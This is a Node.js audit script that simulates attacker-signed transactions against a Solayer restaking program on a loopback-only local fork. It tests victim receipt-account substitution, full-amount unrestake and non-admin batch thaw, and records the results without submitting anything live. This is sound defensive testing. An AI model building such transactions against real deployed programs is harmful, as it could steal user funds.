#!/usr/bin/env node
'use strict';

// Current deployed Solayer ELF, isolated local-fork guard probes.
// Transactions are attacker-owned signed v1 messages and are only simulated
// with sigVerify:true. Nothing is sent to mainnet or committed to the fork.

const fs = require('fs');
const crypto = require('crypto');
const MODULES = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules';
const {PublicKey, Keypair, TransactionInstruction, SystemProgram} = require(`${MODULES}/@solana/web3.js`);
const {getAssociatedTokenAddressSync, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID} = require(`${MODULES}/@solana/spl-token`);
const {encodeV1} = require('./klend-v1-composition.js');

const OUT = `${__dirname}/solayer-signed-v1-guard-probes.json`;
const RPC = process.env.SOLAYER_FORK_RPC || 'http://127.0.0.1:33999';
if (!/^http:\/\/127\.0\.0\.1:\d+$/.test(RPC)) throw new Error('SOLAYER_FORK_RPC must be loopback');
const P = value => new PublicKey(value);
const PROGRAM = P('sSo1iU21jBrU9VaJ8PJib1MtorefUV4fzC9GURa2KNn');
const BNSOL = P('BNso1VUJnh4zcfpZa6986Ea66P6TCp59hvtNJ8b1X85');
const RST = P('bnsoLDvQ8EgtvU9SWdihfbPB7ynkeQQYTFoJERwycW7');
const POOL = P('7RJPqA2b4SicEzLSyUVhGZUdH2rGrTaXV1t7Z4ga2Kpg');
const VAULT = P('9Qj3UvSYbyDFotud3BQeFfrwqXcrKQ92MR3yjqpzA771');
const VICTIM_RST_ATA = P('FSxgEvgmFUD3e1QWmUVVZcAEFmLBpwYWoNTzMX89RPGW');
const SYSTEM = SystemProgram.programId;
const attacker = Keypair.generate();
const attackerLstAta = getAssociatedTokenAddressSync(BNSOL, attacker.publicKey);
const attackerRstAta = getAssociatedTokenAddressSync(RST, attacker.publicKey);
const disc = name => crypto.createHash('sha256').update(`global:${name}`).digest().subarray(0, 8);
const u64 = value => { const out = Buffer.alloc(8); out.writeBigUInt64LE(BigInt(value)); return out; };
const meta = (pubkey, isSigner = false, isWritable = false) => ({pubkey, isSigner, isWritable});

let rpcId = 0;
async function rpc(method, params) {
  const response = await fetch(RPC, {method: 'POST', headers: {'content-type': 'application/json'},
    body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params}), signal: AbortSignal.timeout(20_000)});
  const json = await response.json();
  if (json.error) throw new Error(`${method}: ${json.error.code} ${json.error.message}`);
  return json.result;
}

function unrestakeIx(amount, rstAta = attackerRstAta) {
  return new TransactionInstruction({programId: PROGRAM, keys: [
    meta(attacker.publicKey, true, true), meta(BNSOL), meta(attackerLstAta, false, true),
    meta(rstAta, false, true), meta(RST, false, true), meta(VAULT, false, true), meta(POOL),
    meta(ASSOCIATED_TOKEN_PROGRAM_ID), meta(TOKEN_PROGRAM_ID), meta(SYSTEM),
  ], data: Buffer.concat([disc('unrestake'), u64(amount)])});
}

function batchThawIx() {
  return new TransactionInstruction({programId: PROGRAM, keys: [
    meta(attacker.publicKey, true, true), meta(attacker.publicKey, true), meta(BNSOL),
    meta(RST, false, true), meta(POOL), meta(ASSOCIATED_TOKEN_PROGRAM_ID),
    meta(TOKEN_PROGRAM_ID), meta(SYSTEM),
  ], data: disc('batch_thaw_lst_accounts')});
}

function signV1(instructions, blockhash) {
  const encoded = encodeV1(instructions, attacker.publicKey, blockhash);
  if (encoded.requiredSignatures !== 1) throw new Error(`unexpected signer count ${encoded.requiredSignatures}`);
  const wire = Buffer.from(encoded.wire);
  const message = wire.subarray(0, wire.length - 64);
  const privateKey = crypto.createPrivateKey({key: Buffer.concat([
    Buffer.from('302e020100300506032b657004220420', 'hex'), Buffer.from(attacker.secretKey.subarray(0, 32)),
  ]), format: 'der', type: 'pkcs8'});
  crypto.sign(null, message, privateKey).copy(wire, wire.length - 64);
  return {wire, encoded};
}

async function simulate(label, instructions, blockhash) {
  const {wire, encoded} = signV1(instructions, blockhash);
  const simulation = await rpc('simulateTransaction', [wire.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false, commitment: 'processed',
    innerInstructions: true,
    accounts: {encoding: 'base64', addresses: [VAULT, VICTIM_RST_ATA, attackerLstAta, attackerRstAta].map(String)},
  }]);
  return {
    label, err: simulation.value.err, bytes: encoded.sizeBytes, accountKeys: encoded.addressCount,
    instructions: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
    unitsConsumed: simulation.value.unitsConsumed,
    logs: simulation.value.logs,
  };
}

async function main() {
  await rpc('requestAirdrop', [attacker.publicKey.toBase58(), 10_000_000_000]);
  for (let i = 0; i < 20; i++) {
    const balance = await rpc('getBalance', [attacker.publicKey.toBase58(), {commitment: 'processed'}]);
    if (balance.value >= 10_000_000_000) break;
    await new Promise(resolve => setTimeout(resolve, 200));
  }
  const blockhash = (await rpc('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  const cases = [
    ['unrestake_empty_attacker_receipt_1', [unrestakeIx(1n)]],
    ['unrestake_victim_receipt_substitution_1', [unrestakeIx(1n, VICTIM_RST_ATA)]],
    ['unrestake_victim_receipt_substitution_full_recent_amount', [unrestakeIx(5_484_950_660n, VICTIM_RST_ATA)]],
    ['batch_thaw_attacker_as_admin', [batchThawIx()]],
  ];
  const results = [];
  for (const [label, instructions] of cases) {
    const result = await simulate(label, instructions, blockhash);
    results.push(result);
    console.log(JSON.stringify({label, err: result.err, bytes: result.bytes, accountKeys: result.accountKeys,
      unitsConsumed: result.unitsConsumed, lastLogs: result.logs?.slice(-8)}));
  }
  fs.writeFileSync(OUT, `${JSON.stringify({
    generatedAt: new Date().toISOString(), localForkRpc: RPC,
    currentBinarySha256: crypto.createHash('sha256').update(fs.readFileSync(`${__dirname}/solayer-current.so`)).digest('hex'),
    program: PROGRAM.toBase58(), attacker: attacker.publicKey.toBase58(), signatureVerification: true,
    messageVersion: 1, maxBytes: 4096, maxAccountKeys: 64, liveSubmission: false,
    clonedPool: POOL.toBase58(), clonedVault: VAULT.toBase58(), victimReceiptAccount: VICTIM_RST_ATA.toBase58(),
    attackerLstAta: attackerLstAta.toBase58(), attackerRstAta: attackerRstAta.toBase58(), results,
  }, null, 2)}\n`);
  console.log(JSON.stringify({output: OUT}));
}

main().catch(error => { console.error(error.stack || error.message); process.exitCode = 1; });
